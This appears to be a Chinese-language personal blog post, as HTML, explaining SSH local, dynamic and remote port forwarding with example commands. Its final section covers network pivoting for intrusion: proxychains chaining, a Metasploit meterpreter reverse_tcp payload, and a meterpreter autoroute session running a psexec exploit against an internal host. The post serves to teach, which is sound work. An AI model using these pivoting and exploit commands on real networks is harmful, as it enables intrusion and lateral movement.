@@ -1,0 +1,901 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="笔记,端口转发,SSH隧道," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Sparrow's blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="0x01 ssh隧道有3种类型动态端口转发（Socks 代理） 本地端口转发 远程端口转发 0x01 本地端口转发通过SSH隧道，将一个远端机器能够访问到的地址和端口，映射为一个本地的端口。 已知主机A可以连接主机B，但无法连接主机C。A主机需要访问C主机的VNC服务（5900端口） host1 : 本地主机 host2 : 远程主机（目的主机） host3 :   host1  &amp;lt;-&amp;g">
+<meta name="keywords" content="笔记,端口转发,SSH隧道">
+<meta property="og:type" content="article">
+<meta property="og:title" content="端口转发之SSH隧道">
+<meta property="og:url" content="https://sp4rr0w.github.io/2018/03/29/端口转发之SSH隧道/index.html">
+<meta property="og:site_name" content="Sparrow&#39;s blog">
+<meta property="og:description" content="0x01 ssh隧道有3种类型动态端口转发（Socks 代理） 本地端口转发 远程端口转发 0x01 本地端口转发通过SSH隧道，将一个远端机器能够访问到的地址和端口，映射为一个本地的端口。 已知主机A可以连接主机B，但无法连接主机C。A主机需要访问C主机的VNC服务（5900端口） host1 : 本地主机 host2 : 远程主机（目的主机） host3 :   host1  &amp;lt;-&amp;g">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2018-03-27T10:18:24.062Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="端口转发之SSH隧道">
+<meta name="twitter:description" content="0x01 ssh隧道有3种类型动态端口转发（Socks 代理） 本地端口转发 远程端口转发 0x01 本地端口转发通过SSH隧道，将一个远端机器能够访问到的地址和端口，映射为一个本地的端口。 已知主机A可以连接主机B，但无法连接主机C。A主机需要访问C主机的VNC服务（5900端口） host1 : 本地主机 host2 : 远程主机（目的主机） host3 :   host1  &amp;lt;-&amp;g">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://sp4rr0w.github.io/2018/03/29/端口转发之SSH隧道/"/>
+
+
+
+
+
+  <title>端口转发之SSH隧道 | Sparrow's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Sparrow's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Startseite
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            Über
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Kategorien
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archiv
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-schedule">
+          <a href="/schedule/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-calendar"></i> <br />
+            
+            Schedule
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+            
+            Sitemap
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-commonweal">
+          <a href="/404/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
+            
+            Commonweal 404
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://sp4rr0w.github.io/2018/03/29/端口转发之SSH隧道/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Sparrow">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sparrow's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">端口转发之SSH隧道</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-03-29T15:20:00-04:00">
+                2018-03-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/技术相关/" itemprop="url" rel="index">
+                    <span itemprop="name">技术相关</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <a id="more"></a>
+<h2 id="0x01-ssh隧道有3种类型"><a href="#0x01-ssh隧道有3种类型" class="headerlink" title="0x01 ssh隧道有3种类型"></a>0x01 ssh隧道有3种类型</h2><pre><code>动态端口转发（Socks 代理）
+本地端口转发
+远程端口转发
+</code></pre><h2 id="0x01-本地端口转发"><a href="#0x01-本地端口转发" class="headerlink" title="0x01 本地端口转发"></a>0x01 本地端口转发</h2><p>通过SSH隧道，将一个远端机器能够访问到的地址和端口，映射为一个本地的端口。</p>
+<p>已知主机A可以连接主机B，但无法连接主机C。A主机需要访问C主机的VNC服务（5900端口）</p>
+<pre><code>host1 : 本地主机
+host2 : 远程主机（目的主机）
+host3 : 
+
+host1  &lt;-&gt; host2  (都不通)
+host3同时连通前面两台主机
+host1  -&gt; host2   (最终目的)
+</code></pre><p>想法就是，通过host3，将host1连上host2</p>
+<p>我们在host1执行下面的命令：</p>
+<pre><code>$ ssh -L 2121:host2:21 host3
+</code></pre><p>命令中的L参数一共接受三个值，分别是”本地端口:目标主机:目标主机端口”，它们之间用冒号分隔。</p>
+<p>这条命令的意思，就是指定SSH绑定本地端口2121，然后指定host3将所有的数据，</p>
+<p>转发到目标主机host2的21端口（假定host2运行FTP，默认端口为21）。</p>
+<p>这样一来，在host1连接本地的2121端口，就等于连上了host2的21端口。</p>
+<pre><code>$ ftp localhost:2121
+$ ssh -p 2121 localhost   (21端口改为22)
+</code></pre><p>优点</p>
+<pre><code>无需设置代理
+</code></pre><p>缺点</p>
+<pre><code>每个服务都需要配置不同的端口转发
+</code></pre><h2 id="0x02-动态端口转发"><a href="#0x02-动态端口转发" class="headerlink" title="0x02 动态端口转发"></a>0x02 动态端口转发</h2><p>既然SSH可以传送数据，那么我们可以让那些不加密的网络连接，全部改走SSH连接，从而提高安全性</p>
+<p>动态端口允许通过配置一个本地端口，把通过隧道到数据转发到远端的所有地址。</p>
+<p>本地的应用程序需要使用Socks协议与本地端口通讯。此时SSH充当Socks代理服务器的角色。</p>
+<p>假定我们要让8080端口的数据，都通过SSH传向远程主机：</p>
+<pre><code>$ ssh -D 8080 user@host
+</code></pre><p>SSH会建立一个socket，去监听本地的8080端口。一旦有数据传向那个端口，就自动把它转移到</p>
+<p>SSH连接上面，发往远程主机。</p>
+<p>可以想象，如果8080端口原来是一个不加密端口，现在将变成一个加密端口。</p>
+<p>优点</p>
+<pre><code>配置一个代理服务就可以访问远端机器和与其所在子网络的所有服务
+</code></pre><p>缺点</p>
+<pre><code>应用程序需要额外配置SOCKS代理，若应用程序不支持代理配置则无法使用
+</code></pre><h2 id="0x03-远程端口转发"><a href="#0x03-远程端口转发" class="headerlink" title="0x03 远程端口转发"></a>0x03 远程端口转发</h2><p>远程端口转发用于某些单向阻隔的内网环境，比如说NAT，网络防火墙。<br>在NAT设备之后的内网主机可以直接访问公网主机，但外网主机却无法访问内网主机的服务。<br>如果内网主机向外网主机建立一个远程转发端口，就可以让外网主机通过该端口访问该内网主机的服务。<br>可以把这个内网主机理解为“内应”和“开门者”。</p>
+<pre><code>host1 ： 外网机器
+host2 ： 目的主机
+host3 ： 内网机器
+host3  -&gt; host1  (通)
+host1  -&gt; host3  (不通)
+host1  -&gt; host2  (最终目的)
+</code></pre><p>解决办法是，既然host3可以连host1，那么就从host3上建立与host1的SSH连接，然后在host1上使用这条连接就可以了</p>
+<p>在host3执行下面的命令：</p>
+<pre><code>$ ssh -R 2121:host2:22 root@host1
+-R : &quot;远程主机端口:目标主机:目标主机端口&quot;。
+</code></pre><p>host1监听它自己的2121端口，然后将所有数据经由host3，转发到host2的21端口。<br>由于对于host3来说，host1是远程主机，所以这种情况就被称为”远程端口绑定”。<br>在host1就可以连接host2了：</p>
+<pre><code>$ ssh localhost:2121
+</code></pre><p>如果host3是目的主机的话，即源主机是目的主机，我们的目的是host1-&gt;host3 (通)<br>则：<br>    在host3上执行： ssh -NfR 2121:localhost:22 user@host1 -p 22<br>    将host3的22端口和host1的2121端口绑定，相当于远程端口映射<br>    在host1就可以连接host3了：</p>
+<pre><code>    $ ssh localhost -p 2121
+
+也可以在host2上：
+
+    $ ssh host1 -p 2121
+</code></pre><p>优点</p>
+<pre><code>可以穿越防火墙和NAT设备
+</code></pre><p>缺点</p>
+<pre><code>每个服务都需要配置不同的端口转发
+</code></pre><p>如何禁止端口转发</p>
+<p>设置ssh服务配置文件/etc/ssh/sshd_config</p>
+<pre><code>AllowTcpForwarding no
+</code></pre><h2 id="0x04-简而言之"><a href="#0x04-简而言之" class="headerlink" title="0x04 简而言之"></a>0x04 简而言之</h2><pre><code>http://staff.washington.edu/corey/fw/ssh-port-forwarding.html
+
+本地访问127.0.0.1:port1就是host:port2(用的更多)
+ssh -CfNg -L port1:127.0.0.1:port2 user@host    #本地转发
+
+访问host:port2就是访问127.0.0.1:port1
+ssh -CfNg -R port2:127.0.0.1:port1 user@host    #远程转发
+
+可以将dmz_host的hostport端口通过remote_ip转发到本地的port端口
+ssh -qTfnN -L port:dmz_host:hostport -l user remote_ip   #正向隧道，监听本地port
+
+可以将dmz_host的hostport端口转发到remote_ip的port端口
+ssh -qTfnN -R port:dmz_host:hostport -l user remote_ip   #反向隧道，用于内网穿透防火墙限制之类
+</code></pre><h2 id="0x05-SSH-穿透"><a href="#0x05-SSH-穿透" class="headerlink" title="0x05 SSH 穿透"></a>0x05 SSH 穿透</h2><pre><code>ssh -D 127.0.0.1:1080 -p 22 user@IP 
+Add socks4 127.0.0.1 1080 in /etc/proxychains.conf 
+proxychains commands target 
+</code></pre><p>SSH 穿透从一个网络到另一个网络</p>
+<pre><code>ssh -D 127.0.0.1:1080 -p 22 user1@IP1 
+Add socks4 127.0.0.1 1080 in /etc/proxychains.conf 
+proxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2 
+Add socks4 127.0.0.1 1081 in /etc/proxychains.conf 
+proxychains commands target 
+</code></pre><p>使用 metasploit 进行穿透</p>
+<pre><code>route add X.X.X.X 255.255.255.0 1 
+use auxiliary/server/socks4a 
+run 
+proxychains msfcli windows/* PAYLOAD=windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 RHOST=IP E
+</code></pre><p>或者</p>
+<pre><code># http://www.offensive-security.com/metasploit-unleashed/pivoting/
+meterpreter &gt; ipconfig 
+IP Address  : 10.1.13.3 
+meterpreter &gt; run autoroute -s 10.1.13.0/24 
+meterpreter &gt; run autoroute -p 
+10.1.13.0          255.255.255.0      Session 1 
+meterpreter &gt; Ctrl+Z 
+msf auxiliary(tcp) &gt; use exploit/windows/smb/psexec 
+msf exploit(psexec) &gt; set RHOST 10.1.13.2 
+msf exploit(psexec) &gt; exploit 
+meterpreter &gt; ipconfig 
+IP Address  : 10.1.13.2 
+</code></pre><p>扩展：</p>
+<pre><code>通过VPS SSH隧道使用本地msf
+https://evi1cg.me/archives/Port_Forward_using_VPS_SSH_Tunnel.html
+</code></pre><p>from :<br>    三种不同类型的ssh隧道<br>    <a href="http://hetaoo.iteye.com/blog/2299123" target="_blank" rel="noopener">http://hetaoo.iteye.com/blog/2299123</a><br>    ssh用法及命令<br>    <a href="http://blog.csdn.net/pipisorry/article/details/52269785" target="_blank" rel="noopener">http://blog.csdn.net/pipisorry/article/details/52269785</a><br>    ssh隧道建立<br>    <a href="http://blog.csdn.net/yuanchao99/article/details/72877586" target="_blank" rel="noopener">http://blog.csdn.net/yuanchao99/article/details/72877586</a><br>    xxxx<br>    <a href="https://xianzhi.aliyun.com/forum/topic/142" target="_blank" rel="noopener">https://xianzhi.aliyun.com/forum/topic/142</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/笔记/" rel="tag"># 笔记</a>
+          
+            <a href="/tags/端口转发/" rel="tag"># 端口转发</a>
+          
+            <a href="/tags/SSH隧道/" rel="tag"># SSH隧道</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/03/27/端口转发总结/" rel="next" title="端口转发总结">
+                <i class="fa fa-chevron-left"></i> 端口转发总结
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Inhaltsverzeichnis
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Übersicht
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Sparrow</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">Artikel</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">Kategorien</span>
+                
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">Tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/yourname" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:yourname@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-ssh隧道有3种类型"><span class="nav-number">1.</span> <span class="nav-text">0x01 ssh隧道有3种类型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-本地端口转发"><span class="nav-number">2.</span> <span class="nav-text">0x01 本地端口转发</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-动态端口转发"><span class="nav-number">3.</span> <span class="nav-text">0x02 动态端口转发</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-远程端口转发"><span class="nav-number">4.</span> <span class="nav-text">0x03 远程端口转发</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-简而言之"><span class="nav-number">5.</span> <span class="nav-text">0x04 简而言之</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-SSH-穿透"><span class="nav-number">6.</span> <span class="nav-text">0x05 SSH 穿透</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Sparrow</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
